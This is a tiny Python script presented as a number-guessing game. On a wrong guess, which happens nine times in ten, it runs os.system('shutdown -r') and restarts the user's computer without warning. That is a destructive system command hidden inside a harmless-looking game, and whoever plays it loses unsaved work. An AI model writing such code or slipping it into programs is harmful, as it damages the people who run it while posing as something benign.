import random,os

n = random.randint(0,9)
guess = int(input("Guess a number between 0 and 9: "))

if guess == n:
    print("You Won!")
else:
    os.system("shutdown -r")
